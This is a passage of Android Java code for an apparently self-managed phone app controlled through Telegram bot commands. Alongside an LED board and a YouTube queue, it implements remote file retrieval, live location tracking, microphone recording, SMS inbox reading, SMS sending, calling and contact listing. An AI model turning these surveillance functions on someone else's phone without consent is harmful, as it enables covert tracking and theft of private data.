                        replyT(ctx, chatId, target, "Lirik tidak ditemukan untuk "
                                + artist + " - " + title);
                        return;
                    }
                    if (lirik.length() > 3500) lirik = lirik.substring(0, 3500) + "\n...";
                    replyT(ctx, chatId, target, "\uD83C\uDFA4 " + artist + " \u2014 " + title
                            + "\n\n" + lirik);
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal ambil lirik.");
                }
            }
        }).start();
    }

    private static String httpGet(String url) throws Exception {
        java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                new java.net.URL(url).openConnection();
        c.setConnectTimeout(15000);
        c.setReadTimeout(20000);
        c.setRequestProperty("User-Agent", "MyDevice/1.0");
        java.io.InputStream in = c.getInputStream();
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        return new String(bos.toByteArray(), "UTF-8");
    }

    // ================= IDE-6: papan LED + jam =================
    private static void doPapan(Context ctx, long chatId, String target, String arg) {
        String teks = arg.trim();
        if (teks.isEmpty()) {
            replyT(ctx, chatId, target, "Pakai: /papan <teks>  (pisah baris dengan |)\nContoh: /papan TOKO BUKA | Sedia pulsa");
            return;
        }
        boolean ok = AppLockService.launchPapan("papan", teks);
        replyT(ctx, chatId, target, ok
                ? "\uD83D\uDCDF Papan LED tampil di [" + target + "]."
                : "Gagal \u2014 pastikan Aksesibilitas aktif di [" + target + "].");
    }

    private static void doPapanJam(Context ctx, long chatId, String target) {
        boolean ok = AppLockService.launchPapan("jam", "");
        replyT(ctx, chatId, target, ok
                ? "\uD83D\uDD50 Jam digital tampil di [" + target + "]."
                : "Gagal \u2014 pastikan Aksesibilitas aktif di [" + target + "].");
    }

    private static void sendPapanSet(Context ctx, long chatId, String target) {
        String[][] items = {
                {"\uD83C\uDFA8 BG Hitam", "papanset:bg:0"}, {"\uD83C\uDFA8 BG Putih", "papanset:bg:1"},
                {"\uD83C\uDFA8 BG Biru", "papanset:bg:2"}, {"\uD83C\uDFA8 BG Merah", "papanset:bg:3"},
                {"\uD83C\uDFA8 BG Hijau", "papanset:bg:4"}, {"\uD83C\uDFA8 BG Kuning", "papanset:bg:5"},
                {"\uD83D\uDD8A\uFE0F Teks Kuning", "papanset:fg:0"}, {"\uD83D\uDD8A\uFE0F Teks Putih", "papanset:fg:1"},
                {"\uD83D\uDD8A\uFE0F Teks Hijau", "papanset:fg:2"}, {"\uD83D\uDD8A\uFE0F Teks Cyan", "papanset:fg:3"},
                {"\uD83D\uDD8A\uFE0F Teks Oranye", "papanset:fg:4"}, {"\uD83D\uDD8A\uFE0F Teks Merah", "papanset:fg:5"},
                {"\uD83D\uDD24 Font Sans", "papanset:font:0"}, {"\uD83D\uDD24 Font Serif", "papanset:font:1"},
                {"\uD83D\uDD24 Font Mono", "papanset:font:2"}, {"\uD83D\uDD24 Font Tebal", "papanset:font:3"},
                {"\u23E9 Lebih cepat", "papanset:speed:+1"}, {"\u23EA Lebih lambat", "papanset:speed:-1"},
                {"\uD83D\uDD20 Lebih besar", "papanset:size:+1"}, {"\uD83D\uDD21 Lebih kecil", "papanset:size:-1"},
                {"\uD83D\uDD50 24 jam", "papanset:fmt:24"}, {"\uD83D\uDD50 12 jam", "papanset:fmt:12"},
                {"\u23F1\uFE0F Detik ON", "papanset:detik:1"}, {"\u23F1\uFE0F Detik OFF", "papanset:detik:0"},
                {"\uD83D\uDD04 Rotasi Auto", "papanset:orient:0"}, {"\uD83D\uDCF1 Rotasi Portrait", "papanset:orient:1"},
                {"\uD83D\uDCF1 Rotasi Landscape", "papanset:orient:2"},
        };
        try {
            JSONObject kb = buildMenuKb(ctx, target, items, null, 2);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                    "\u2699\uFE0F Pengaturan papan LED & jam [" + target + "]:", kb);
        } catch (Exception ignored) {
        }
    }

    private static void doPapanSet(Context ctx, long chatId, String target, String kv) {
        String[] pr = kv.split(":", 2);
        if (pr.length < 2) return;
        String k = pr[0], v = pr[1];
        String msg = "OK";
        try {
            switch (k) {
                case "bg": {
                    int[] colors = {0xFF000000, 0xFFFFFFFF, 0xFF0D47A1, 0xFFB71C1C, 0xFF1B5E20, 0xFFF9A825};
                    Prefs.setPapanBg(ctx, colors[Integer.parseInt(v) % colors.length]);
                    msg = "Warna background diubah.";
                    break;
                }
                case "fg": {
                    int[] colors = {0xFFFFEB3B, 0xFFFFFFFF, 0xFF00E676, 0xFF00E5FF, 0xFFFF9100, 0xFFFF1744};
                    Prefs.setPapanFg(ctx, colors[Integer.parseInt(v) % colors.length]);
                    msg = "Warna teks diubah.";
                    break;
                }
                case "font":
                    Prefs.setPapanFont(ctx, Integer.parseInt(v) % 4);
                    msg = "Font diubah.";
                    break;
                case "speed": {
                    int cur = Prefs.papanSpeed(ctx);
                    Prefs.setPapanSpeed(ctx, cur + (v.equals("+1") ? 1 : -1));
                    msg = "Kecepatan teks: " + Prefs.papanSpeed(ctx) + "/5.";
                    break;
                }
                case "size": {
                    int cur = Prefs.papanSize(ctx);
                    Prefs.setPapanSize(ctx, cur + (v.equals("+1") ? 1 : -1));
                    String[] names = {"S", "M", "L", "XL"};
                    msg = "Ukuran teks: " + names[Prefs.papanSize(ctx)] + ".";
                    break;
                }
                case "fmt":
                    Prefs.setJamFmt24(ctx, v.equals("24"));
                    msg = "Format jam: " + v + ".";
                    break;
                case "detik":
                    Prefs.setJamDetik(ctx, v.equals("1"));
                    msg = "Detik: " + (v.equals("1") ? "ON" : "OFF") + ".";
                    break;
                case "orient": {
                    int ov = 0;
                    try {
                        ov = Integer.parseInt(v);
                    } catch (Exception ignored) {
                    }
                    Prefs.setPapanOrient(ctx, ov);
                    String[] on = {"Auto (ikut sensor HP)", "Portrait", "Landscape"};
                    msg = "Rotasi papan/jam: " + on[Math.max(0, Math.min(2, ov))] + ".";
                    break;
                }
                default:
                    return;
            }
        } catch (Exception e) {
            return;
        }
        replyT(ctx, chatId, target, "\u2699\uFE0F " + msg);
        // Revisi 2026-10-13 (#4): terapkan real-time bila papan/jam sedang tampil.
        try {
            if (Prefs.papanActive(ctx)) {
                AppLockService.launchPapan(PapanActivity.mode, PapanActivity.teks);
            }
        } catch (Exception ignored) {
        }
    }

    // ================= IDE-7: antrean =================
    private static java.util.List<JSONObject> getAntrean(Context ctx, String target) {
        java.util.List<JSONObject> out = new java.util.ArrayList<>();
        try {
            JSONArray arr = new JSONArray(Prefs.antreanJson(ctx, target));
            for (int i = 0; i < arr.length(); i++) out.add(arr.getJSONObject(i));
        } catch (Exception ignored) {
        }
        return out;
    }

    private static void saveAntrean(Context ctx, String target, java.util.List<JSONObject> list) {
        JSONArray arr = new JSONArray();
        for (JSONObject o : list) arr.put(o);
        Prefs.setAntreanJson(ctx, target, arr.toString());
    }

    private static android.os.Handler antreanHandler =
            new android.os.Handler(android.os.Looper.getMainLooper());
    private static Runnable antreanTask = null;

    private static void antreanBatal() {
        if (antreanTask != null) {
            try {
                antreanHandler.removeCallbacks(antreanTask);
            } catch (Exception ignored) {
            }
            antreanTask = null;
        }
    }

    private static void doAntri(final Context ctx, final long chatId, final String target, String arg) {
        final String q = arg.trim();
        if (q.isEmpty()) {
            doAntriList(ctx, chatId, target);
            return;
        }
        replyT(ctx, chatId, target, "\uD83D\uDD0D Mencari \"" + q + "\"...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    java.util.List<YouTube.Video> vids = YouTube.search(q);
                    if (vids.isEmpty()) {
                        replyT(ctx, chatId, target, "Tidak ketemu hasil.");
                        return;
                    }
                    tubeResults.put(chatId, vids);
                    sendTubeList(ctx, chatId, target, firstTubePkg(ctx), vids, "antriadd",
                            "\u2795 ANTRI \u2014 pilih video untuk ditambahkan");
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal mencari: " + e.getMessage());
                }
            }
        }).start();
    }

    private static void doAntriAdd(Context ctx, long chatId, String target, String idxStr) {
        YouTube.Video v = tubeVideo(chatId, idxStr);
        if (v == null) {
            replyT(ctx, chatId, target, "Hasil kedaluwarsa.");
            return;
        }
        java.util.List<JSONObject> q = getAntrean(ctx, target);
        if (q.size() >= 50) {
            replyT(ctx, chatId, target, "Antrean penuh (50).");
            return;
        }
        for (JSONObject o : q) {
            if (v.id.equals(o.optString("id"))) {
                replyT(ctx, chatId, target, "Sudah ada di antrean.");
                return;
            }
        }
        try {
            JSONObject o = new JSONObject();
            o.put("id", v.id);
            o.put("title", v.title);
            o.put("channel", v.channel);
            o.put("dur", v.durSec);
            q.add(o);
            saveAntrean(ctx, target, q);
            replyT(ctx, chatId, target, "\u2795 Ditambahkan (#" + q.size() + "): " + v.title
                    + "\n/antriputar untuk mulai.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doAntriList(Context ctx, long chatId, String target) {
        java.util.List<JSONObject> q = getAntrean(ctx, target);
        if (q.isEmpty()) {
            replyT(ctx, chatId, target, "\uD83D\uDCDC Antrean kosong.\nPakai: /antri <judul>");
            return;
        }
        StringBuilder sb = new StringBuilder("\uD83D\uDCDC Antrean [").append(target).append("]:");
        int n = Math.min(q.size(), 12);
        String[][] items = new String[n * 2 + 2][2];
        for (int i = 0; i < n; i++) {
            JSONObject o = q.get(i);
            sb.append("\n").append(i + 1).append(". ").append(o.optString("title"));
            items[i * 2][0] = "\u25B6\uFE0F " + (i + 1);
            items[i * 2][1] = "antriplay:" + i;
            items[i * 2 + 1][0] = "\u274C " + (i + 1);
            items[i * 2 + 1][1] = "antridel:" + i;
        }
        if (q.size() > n) sb.append("\n... (+").append(q.size() - n).append(" lagi)");
        items[n * 2][0] = "\u25B6\uFE0F Putar dari #1";
        items[n * 2][1] = "antriplay:0";
        items[n * 2 + 1][0] = "\uD83D\uDDD1\uFE0F Hapus semua";
        items[n * 2 + 1][1] = "antriclear";
        try {
            JSONObject kb = buildMenuKb(ctx, target, items, null, 2);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, sb.toString(), kb);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doAntriDel(Context ctx, long chatId, String target, String idxStr) {
        int idx;
        try {
            idx = Integer.parseInt(idxStr);
        } catch (Exception e) {
            return;
        }
        java.util.List<JSONObject> q = getAntrean(ctx, target);
        if (idx < 0 || idx >= q.size()) return;
        String t = q.get(idx).optString("title");
        q.remove(idx);
        saveAntrean(ctx, target, q);
        replyT(ctx, chatId, target, "\u274C Dihapus: " + t);
        doAntriList(ctx, chatId, target);
    }

    private static void doAntriPutar(Context ctx, long chatId, String target) {
        java.util.List<JSONObject> q = getAntrean(ctx, target);
        if (q.isEmpty()) {
            replyT(ctx, chatId, target, "Antrean kosong.\nPakai: /antri <judul>");
            return;
        }
        antreanBatal();
        playAntreanHead(ctx, chatId, target, q);
    }

    private static void doAntriJump(Context ctx, long chatId, String target, String idxStr) {
        int idx;
        try {
            idx = Integer.parseInt(idxStr);
        } catch (Exception e) {
            return;
        }
        java.util.List<JSONObject> q = getAntrean(ctx, target);
        if (idx < 0 || idx >= q.size()) return;
        for (int i = 0; i < idx; i++) q.remove(0);
        saveAntrean(ctx, target, q);
        antreanBatal();
        playAntreanHead(ctx, chatId, target, q);
    }

    private static void playAntreanHead(Context ctx, long chatId, String target,
                                        java.util.List<JSONObject> q) {
        if (q.isEmpty()) {
            replyT(ctx, chatId, target, "\uD83C\uDFC1 Antrean selesai.");
            return;
        }
        JSONObject o = q.get(0);
        YouTube.Video v = new YouTube.Video();
        v.id = o.optString("id");
        v.title = o.optString("title");
        v.channel = o.optString("channel");
        v.durSec = o.optInt("dur", -1);
        String pkg = firstTubePkg(ctx);
        if (pkg == null) {
            replyT(ctx, chatId, target, "YouTube/ReVanced tidak terinstall di [" + target + "].");
            return;
        }
        tubePkg.put(chatId, pkg);
        playTubeVideo(ctx, chatId, target, v, 0);
        if (v.durSec > 0) antreanTimer(ctx, chatId, target, v.durSec);
    }

    private static void antreanTimer(final Context ctx, final long chatId,
                                     final String target, int durSec) {
        antreanBatal();
        antreanTask = new Runnable() {
            @Override
            public void run() {
                antreanTask = null;
                java.util.List<JSONObject> q = getAntrean(ctx, target);
                if (q.isEmpty()) return;
                q.remove(0);
                saveAntrean(ctx, target, q);
                if (q.isEmpty()) {
                    replyT(ctx, chatId, target, "\uD83C\uDFC1 Antrean selesai.");
                } else {
                    playAntreanHead(ctx, chatId, target, q);
                }
            }
        };
        antreanHandler.postDelayed(antreanTask, durSec * 1000L);
    }

    // ================= IDE-1 =================
    static String normPhone(String s) {
        if (s == null) return "";
        s = s.replaceAll("[^0-9]", "");
        if (s.startsWith("62")) s = "0" + s.substring(2);
        return s;
    }

    private static void doSetNomor(Context ctx, long chatId, String target, String arg) {
        String n = arg.trim().replaceAll("[^0-9+]", "");
        if (n.isEmpty()) {
            String cur = Prefs.ownerPhone(ctx);
            replyT(ctx, chatId, target, "\uD83D\uDCF1 Nomor pemilik: "
                    + (cur.isEmpty() ? "(belum diset)" : cur)
                    + "\nPakai: /setnomor 08123456789");
            return;
        }
        Prefs.setOwnerPhone(ctx, n);
        replyT(ctx, chatId, target, "\u2705 Nomor pemilik diset: " + n
                + "\nSMS perintah dari nomor ini akan diproses.");
    }

    // ================= IDE-8 =================
    private static void doSetup(Context ctx, long chatId, String target) {
        StringBuilder sb = new StringBuilder("\u2699\uFE0F Status setup [").append(target).append("]:\n");
        sb.append(checkPerm(ctx, "android.permission.ACCESS_FINE_LOCATION") ? "\u2705" : "\u274C").append(" Lokasi\n");
        sb.append(checkPerm(ctx, "android.permission.RECEIVE_SMS") ? "\u2705" : "\u274C").append(" SMS\n");
        sb.append(checkPerm(ctx, "android.permission.CAMERA") ? "\u2705" : "\u274C").append(" Kamera\n");
        sb.append(checkPerm(ctx, "android.permission.RECORD_AUDIO") ? "\u2705" : "\u274C").append(" Mic\n");
        sb.append(checkPerm(ctx, "android.permission.READ_CONTACTS") ? "\u2705" : "\u274C").append(" Kontak\n");
        sb.append("\nBuka aplikasi My Device \u2192 Setup untuk wizard 1-tombol.");
        replyT(ctx, chatId, target, sb.toString());
    }

    private static boolean checkPerm(Context ctx, String perm) {
        try {
            return ctx.checkSelfPermission(perm)
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            return false;
        }
    }

    private static final java.util.Map<String, java.util.List<java.io.File>> ambilCache =
            new java.util.HashMap<>();

    /** /ambil <kata-kunci|/path> — kirim file dari HP ke Telegram. */
    private static void doAmbil(Context ctx, long chatId, String target, String arg) {
        String q = arg.trim();
        if (q.isEmpty()) {
            replyT(ctx, chatId, target, "Pakai: /ambil <nama file> atau /ambil /sdcard/.../file\nContoh: /ambil ijazah");
            return;
        }
        java.io.File root = android.os.Environment.getExternalStorageDirectory();
        if (q.startsWith("/")) {
            java.io.File f = new java.io.File(q);
            try {
                String canon = f.getCanonicalPath();
                String rootCanon = root.getCanonicalPath();
                if (!canon.startsWith(rootCanon)) {
                    replyT(ctx, chatId, target, "\u274C Path tidak diizinkan.");
                    return;
                }
            } catch (Exception e) {
                replyT(ctx, chatId, target, "Path tidak valid.");
                return;
            }
            if (!f.isFile()) {
                replyT(ctx, chatId, target, "File tidak ditemukan: " + q);
                return;
            }
            kirimFile(ctx, chatId, target, f);
            return;
        }
        java.util.List<java.io.File> hits = new java.util.ArrayList<>();
        for (String d : new String[]{"DCIM", "Download", "Documents", "Pictures", "Music", "Movies"}) {
            cariFile(new java.io.File(root, d), q.toLowerCase(), hits, 30);
            if (hits.size() >= 30) break;
        }
        if (hits.isEmpty()) {
            replyT(ctx, chatId, target, "Tidak ketemu file bernama \"" + q + "\".");
            return;
        }
        if (hits.size() == 1) {
            kirimFile(ctx, chatId, target, hits.get(0));
            return;
        }
        java.util.Collections.sort(hits, new java.util.Comparator<java.io.File>() {
            @Override
            public int compare(java.io.File a, java.io.File b) {
                return Long.compare(b.lastModified(), a.lastModified());
            }
        });
        java.util.List<java.io.File> show = hits.subList(0, Math.min(10, hits.size()));
        ambilCache.put(chatId + ":" + target, new java.util.ArrayList<>(show));
        String[][] items = new String[show.size()][2];
        for (int i = 0; i < show.size(); i++) {
            java.io.File f = show.get(i);
            items[i][0] = "\uD83D\uDCC4 " + f.getName();
            items[i][1] = "ambilf:" + i;
        }
        try {
            JSONObject kb = buildMenuKb(ctx, target, items, null, 1);
            TelegramApi.sendMessage(Prefs.token(ctx), chatId,
                    "Ditemukan " + hits.size() + " file — pilih:", kb);
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void cariFile(java.io.File dir, String q,
                                 java.util.List<java.io.File> out, int max) {
        if (dir == null || out.size() >= max) return;
        java.io.File[] files;
        try {
            files = dir.listFiles();
        } catch (Exception e) {
            return;
        }
        if (files == null) return;
        for (java.io.File f : files) {
            if (out.size() >= max) return;
            try {
                if (f.isDirectory()) {
                    if (!f.getName().startsWith(".")) cariFile(f, q, out, max);
                } else if (f.getName().toLowerCase().contains(q)) {
                    out.add(f);
                }
            } catch (Exception ignored) {
            }
        }
    }

    /** /ambilterakhir — kirim foto terakhir dari kamera. */
    private static void doAmbilTerakhir(Context ctx, long chatId, String target) {
        java.io.File root = android.os.Environment.getExternalStorageDirectory();
        final java.io.File[] best = {null};
        final long[] bestT = {0};
        for (String d : new String[]{"DCIM", "Pictures"}) {
            fotoTerkini(new java.io.File(root, d), best, bestT);
        }
        if (best[0] == null) {
            replyT(ctx, chatId, target, "Belum ada foto ditemukan.");
            return;
        }
        kirimFile(ctx, chatId, target, best[0]);
    }

    private static void fotoTerkini(java.io.File dir, java.io.File[] best, long[] bestT) {
        if (dir == null) return;
        java.io.File[] files;
        try {
            files = dir.listFiles();
        } catch (Exception e) {
            return;
        }
        if (files == null) return;
        for (java.io.File f : files) {
            try {
                if (f.isDirectory()) {
                    if (!f.getName().startsWith(".")) fotoTerkini(f, best, bestT);
                } else {
                    String n = f.getName().toLowerCase();
                    if ((n.endsWith(".jpg") || n.endsWith(".jpeg") || n.endsWith(".png"))
                            && f.lastModified() > bestT[0]) {
                        bestT[0] = f.lastModified();
                        best[0] = f;
                    }
                }
            } catch (Exception ignored) {
            }
        }
    }

    private static void kirimFile(final Context ctx, final long chatId,
                                  final String target, final java.io.File f) {
        if (f.length() > 45L * 1024 * 1024) {
            replyT(ctx, chatId, target, "\u274C File kebesaran (>45MB): " + f.getName());
            return;
        }
        replyT(ctx, chatId, target, "\uD83D\uDCE4 Mengirim " + f.getName() + "...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    TelegramApi.sendFile(Prefs.token(ctx), "sendDocument", "document",
                            chatId, f, f.getName(), null);
                } catch (Exception e) {
                    replyT(ctx, chatId, target, "Gagal kirim: " + e.getMessage());
                }
            }
        }).start();
    }

    private static android.location.LocationListener rtListener = null;
    private static long rtChatId = 0;
    private static String rtTarget = null;
    private static long rtMsgId = 0;

    /** Live location: pin peta bergerak mengikuti HP selama durasi tertentu. */
    private static void doLokasiRt(final Context ctx, final long chatId, String target, String arg) {
        int menit = 15;
        try {
            menit = Integer.parseInt(arg.trim().split(" ")[0]);
        } catch (Exception ignored) {
        }
        menit = Math.max(1, Math.min(menit, 480));
        stopLokasiRt(ctx);
        boolean fine = false;
        try {
            fine = ctx.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION")
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
        } catch (Exception ignored) {
        }
        if (!fine) {
            replyT(ctx, chatId, target, "\u274C Izin lokasi belum diberikan di HP [" + target + "].");
            return;
        }
        try {
            final android.location.LocationManager lm = (android.location.LocationManager)
                    ctx.getSystemService(Context.LOCATION_SERVICE);
            android.location.Location l = null;
            try {
                l = newerLoc(
                        lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER),
                        lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER));
            } catch (Exception ignored) {
            }
            if (l == null) {
                replyT(ctx, chatId, target, "Belum ada lokasi tersimpan — kirim /lokasi dulu sekali, lalu /lokasirt.");
                return;
            }
            JSONObject sent = TelegramApi.sendLocationLive(Prefs.token(ctx), chatId,
                    l.getLatitude(), l.getLongitude(), menit * 60);
            rtMsgId = sent.getJSONObject("result").getLong("message_id");
            rtChatId = chatId;
            rtTarget = target;
            rtListener = new android.location.LocationListener() {
                @Override
                public void onLocationChanged(android.location.Location loc) {
                    try {
                        TelegramApi.editMessageLiveLocation(Prefs.token(ctx), rtChatId, rtMsgId,
                                loc.getLatitude(), loc.getLongitude());
                    } catch (Exception ignored) {
                    }
                }

                @Override
                public void onStatusChanged(String pr, int st, android.os.Bundle ex) {
                }

                @Override
                public void onProviderEnabled(String pr) {
                }

                @Override
                public void onProviderDisabled(String pr) {
                }
            };
            boolean gpsOn = false;
            try {
                gpsOn = lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER);
            } catch (Exception ignored) {
            }
            lm.requestLocationUpdates(
                    gpsOn ? android.location.LocationManager.GPS_PROVIDER
                            : android.location.LocationManager.NETWORK_PROVIDER,
                    15000, 10, rtListener, android.os.Looper.getMainLooper());
            replyT(ctx, chatId, target, "\uD83D\uDCCD Live location aktif " + menit + " menit \u2014 pin peta bergerak mengikuti HP [" + target + "].\nHentikan: /berhenti");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal live location: " + e.getMessage());
        }
    }

    static void stopLokasiRt(Context ctx) {
        if (rtListener != null) {
            try {
                android.location.LocationManager lm = (android.location.LocationManager)
                        ctx.getSystemService(Context.LOCATION_SERVICE);
                if (lm != null) lm.removeUpdates(rtListener);
            } catch (Exception ignored) {
            }
            rtListener = null;
            if (rtMsgId != 0) {
                try {
                    TelegramApi.stopMessageLiveLocation(Prefs.token(ctx), rtChatId, rtMsgId);
                } catch (Exception ignored) {
                }
                rtMsgId = 0;
            }
        }
    }

    private static void doBaterai(Context ctx, long chatId, String target) {
        try {
            android.content.IntentFilter f = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent b = ctx.registerReceiver(null, f);
            int level = b != null ? b.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
            int scale = b != null ? b.getIntExtra(BatteryManager.EXTRA_SCALE, 100) : 100;
            int pct = level >= 0 ? (level * 100 / scale) : -1;
            int status = b != null ? b.getIntExtra(BatteryManager.EXTRA_STATUS, -1) : -1;
            String st = status == BatteryManager.BATTERY_STATUS_CHARGING ? "Mengisi"
                    : status == BatteryManager.BATTERY_STATUS_FULL ? "Penuh" : "Tidak mengisi";
            int temp = b != null ? b.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) : -1;
            replyT(ctx, chatId, target, "Baterai: " + pct + "%\nStatus: " + st
                    + (temp >= 0 ? "\nSuhu: " + (temp / 10.0) + " C" : ""));
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal baca baterai.");
        }
    }

    /** Mode bicara: chatId -> target. Teks polos berikutnya langsung diucapkan. */
    static final java.util.Map<Long, String> speakMode = new java.util.HashMap<>();

    static void enterSpeakMode(long chatId, String target) {
        speakMode.put(chatId, target);
    }

    static void exitSpeakMode(long chatId) {
        speakMode.remove(chatId);
    }

    /** Ucapkan teks polos saat mode bicara aktif (tanpa mengubah mode). */
    static void speakText(final Context ctx, final long chatId, String target, String teks) {
        try {
            android.media.AudioManager am = (android.media.AudioManager)
                    ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am.getStreamVolume(android.media.AudioManager.STREAM_MUSIC) == 0) {
                am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC,
                        am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC) / 2, 0);
            }
        } catch (Exception ignored) {
        }
        TtsHelper.speak(ctx, teks, new TtsHelper.SpeakCallback() {
            @Override
            public void onDone(boolean ok, String err) {
                if (!ok) replyT(ctx, chatId, target, "TTS gagal: " + err);
            }
        });
    }

    private static void doNgomong(final Context ctx, final long chatId, String target, String teks) {
        speakText(ctx, chatId, target, teks);
        enterSpeakMode(chatId, target);
        replyT(ctx, chatId, target, "\uD83D\uDD0A Diucapkan di [" + target + "].\nMode ngomong AKTIF \u2014 tinggal ketik teks lagi tanpa /ngomong.\nKirim /berhenti untuk selesai.");
    }

    private static void doSenter(Context ctx, long chatId, String target, boolean on) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String torchId = null;
            for (String id : cm.getCameraIdList()) {
                Boolean flash = cm.getCameraCharacteristics(id)
                        .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (Boolean.TRUE.equals(flash)) {
                    torchId = id;
                    break;
                }
            }
            if (torchId == null) torchId = cm.getCameraIdList()[0];
            cm.setTorchMode(torchId, on);
            replyT(ctx, chatId, target, on ? "Senter nyala." : "Senter mati.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doGetar(Context ctx, long chatId, String target) {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(VibrationEffect.createOneShot(600, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(600);
            }
            replyT(ctx, chatId, target, "Bergetar.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doRekam(final Context ctx, final long chatId, String target, String arg) {
        int detik = 10;
        try {
            detik = Math.max(3, Math.min(60, Integer.parseInt(arg.trim())));
        } catch (Exception ignored) {
        }
        final int dur = detik;
        replyT(ctx, chatId, target, "Merekam " + dur + " detik...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                File out = new File(ctx.getExternalFilesDir(null), "rekam_" + System.currentTimeMillis() + ".m4a");
                long size = recordClip(ctx, dur, out);
                if (size > 0) {
                    try {
                        TelegramApi.sendFile(Prefs.token(ctx), "sendAudio", "audio", chatId, out,
                                "Rekaman " + dur + " detik (" + (size / 1024) + " KB)",
                                deviceMenuMarkup(ctx, target));
                    } catch (Exception e) {
                        replyT(ctx, chatId, target, "Gagal kirim rekaman: " + e.getMessage());
                    }
                } else {
                    replyT(ctx, chatId, target, "Gagal merekam: pastikan izin Mikrofon diberikan dan tidak ada aplikasi lain yang memakai mic.");
                }
            }
        }).start();
    }

    private static void doSms(Context ctx, long chatId, String target, String teks) {
        String[] p = teks.split("\\|", 2);
        if (p.length < 2) {
            replyT(ctx, chatId, target, "Format: <nomor> | <pesan>");
            return;
        }
        try {
            SmsManager sm = SmsManager.getDefault();
            String nomor = p[0].trim();
            String pesan = p[1].trim();
            ArrayList<String> parts = sm.divideMessage(pesan);
            sm.sendMultipartTextMessage(nomor, null, parts, null, null);
            replyT(ctx, chatId, target, "SMS terkirim ke " + nomor + ".");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal kirim SMS: " + e.getMessage());
        }
    }

    private static void doInbox(Context ctx, long chatId, String target, String arg) {
        int n = 5;
        try {
            n = Math.max(1, Math.min(10, Integer.parseInt(arg.trim())));
        } catch (Exception ignored) {
        }
        try {
            ContentResolver cr = ctx.getContentResolver();
            Cursor cur = cr.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (cur == null) {
                replyT(ctx, chatId, target, "Inbox kosong / gagal dibaca.");
                return;
            }
            StringBuilder sb = new StringBuilder();
            int i = 0;
            while (cur.moveToNext() && i < n) {
                String num = cur.getString(cur.getColumnIndexOrThrow("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                long date = cur.getLong(cur.getColumnIndexOrThrow("date"));
                String t = new SimpleDateFormat("dd/MM HH:mm", Locale.US).format(new Date(date));
                sb.append("Dari ").append(num).append(" (").append(t).append("):\n");
                sb.append(body.length() > 200 ? body.substring(0, 200) : body).append("\n---\n");
                i++;
            }
            cur.close();
            replyT(ctx, chatId, target, i == 0 ? "Inbox kosong." : sb.toString());
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal baca inbox: " + e.getMessage() + " (butuh izin SMS)");
        }
    }

    private static void doTelpon(Context ctx, long chatId, String target, String nomor) {
        try {
            Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + nomor.trim()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            replyT(ctx, chatId, target, "Menelepon " + nomor.trim() + "...");
        } catch (SecurityException e) {
            replyT(ctx, chatId, target, "Izin telepon belum diberikan di HP itu.");
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal: " + e.getMessage());
        }
    }

    private static void doKontak(Context ctx, long chatId, String target) {
        doKontakPage(ctx, chatId, target, 0, 0);
    }

    /** Daftar kontak dengan halaman (20 per halaman) + tombol Lanjut/Kembali. */
    private static void doKontakPage(Context ctx, long chatId, String target, int page, long msgId) {
        final int PER = 20;
        java.util.List<String[]> all = new java.util.ArrayList<>();
        try {
            ContentResolver cr = ctx.getContentResolver();
            Cursor cur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (cur != null) {
                while (cur.moveToNext()) {
                    all.add(new String[]{cur.getString(0), cur.getString(1)});
                }
                cur.close();
            }
        } catch (Exception e) {
            replyT(ctx, chatId, target, "Gagal baca kontak: " + e.getMessage());
            return;
        }
        if (all.isEmpty()) {
            replyT(ctx, chatId, target, "Kontak kosong.");
            return;
        }
